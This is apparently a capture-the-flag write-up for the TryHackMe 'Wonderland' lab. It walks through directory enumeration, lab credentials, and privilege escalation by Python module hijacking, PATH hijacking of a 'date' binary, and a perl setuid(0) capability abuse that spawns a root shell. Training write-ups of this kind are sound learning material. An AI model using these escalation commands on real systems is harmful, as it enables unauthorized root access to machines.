# Write up for THM room [wonderland](https://tryhackme.com/room/wonderland)

```fish
set -gx IP 10.10.198.182
```

## Enumerate with nmap

```fish
sudo nmap -sN -sC -sV -oN nmap/init $IP
```

> Found open ports: `20 & 80`


## Enumerate http server

```fish
gobuster dir -u $IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

> found folders: `/img`, `/r`, `/poem`

Do enumeration for found folders

```fish
gobuster dir -u $IP/img -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
gobuster dir -u $IP/r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
gobuster dir -u $IP/poem -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Here we go
gobuster dir -u $IP/r/a -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
gobuster dir -u $IP/r/a/b -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
gobuster dir -u $IP/r/a/b/b -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
gobuster dir -u $IP/r/a/b/b/i -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
gobuster dir -u $IP/r/a/b/b/i/t -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

> Found credentials on `/r/a/b/b/i/t`: `alice:HowDothTheLittleCrocodileImproveHisShiningTail`

## SSH on server

```fish
ssh alice@$IP
```

> Found users: `alice`, `hatter`, `rabbit`, `tryhackme`

run `sudo -l` to get sudo informations


```
[sudo] password for alice:
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

in `walrus_and_the_carpenter` script we import `random`.
So create a `random.py` file in the current directory with following content:

```python3
import os

os.system("/bin/bash")
```

> Here we go: Signed in user: `rabbit`

Execute `./teaParty`

```
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Thu, 26 Oct 2023 10:29:55 +0000
Ask very nicely, and I will give you some tea while you wait for him
```

Because it's a ELF file it looks like the third line will execute an `date`-command. So create your own:

```
export PATH=/tmp:$PATH
echo "#/bin/bash\n/bin/bash" > /tmp/date
```

Execute `./teaParty` again. Now you are logged in as hatter.

> Found `password.txt` in `/home/hatter`: 'WhyIsARavenLikeAWritingDesk?'

## More enumeration as hatter

Find methods that can set SUID Flags:

```bash
getcap -r / 2>/dev/null
```

> `perl` can do so.


## Set suid flag with perl [here](https://gtfobins.github.io/gtfobins/perl/#capabilities)

```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```
